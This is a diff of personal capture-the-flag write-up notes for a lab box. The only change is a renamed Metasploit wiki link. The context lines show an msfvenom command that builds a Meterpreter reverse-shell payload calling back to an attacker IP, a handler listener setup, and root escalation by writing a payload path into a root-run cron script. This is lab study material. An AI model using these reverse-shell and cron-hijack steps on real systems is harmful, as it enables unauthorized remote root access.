@@ -172,7 +172,7 @@ Someone asked what our main ingredient to our spice soup is today. I figured I c
 - make a payload first using [[msfvenom]]:
 	- `msfvenom -p linux/x86/meterpreter_reverse_tcp -f elf -o shell.elf LHOST=10.21.154.145 LPORT=1338` 
 - upload it to the target machine and give it proper permissions to run
-- set up a listener with [[metasploit]]: 
+- set up a listener with [[metasploit_framework]]: 
 	- `use exploit/multi/handler` 
 		- generic exploit handler, listens for payloads
 	- `set payload linux/x86/meterpreter/reverse_tcp`
@@ -433,7 +433,7 @@ Done!
 ## priv esc to root
 - SOOOOOOOOOOOOOOOOO we got a file we have full access to that gets ran as root every one minutes 
 - i just `echo`'d `/tmp/shell5.elf` into `/etc/print.sh` (i created another payload called `shell5.elf`with [[msfvenom]] and uploaded it at `/tmp` that listens on a different port than the one the current meterpreter session is using)
-- and then i ran another listener in [[metasploit]] that listens on that port 
+- and then i ran another listener in [[metasploit_framework]] that listens on that port 
 - and one minute later we got rooooooooooooooooooooooottttttttt <br>
 ![[startupHasBeenRooted.png]]
 - `root.txt`:
